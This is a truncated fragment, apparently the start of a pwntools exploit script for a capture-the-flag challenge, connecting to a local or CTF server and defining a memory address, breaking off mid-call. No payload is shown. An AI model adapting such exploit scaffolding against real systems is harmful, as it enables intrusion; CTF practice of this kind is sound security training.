from pwn import *

context.arch = 'amd64'

host = '127.0.0.1'
port = 8888
# host = 'csie.ctf.tw'
# port = 10127

r = remote(host, port)

read_input_addr = 0x6010a0

r.recvuntil(
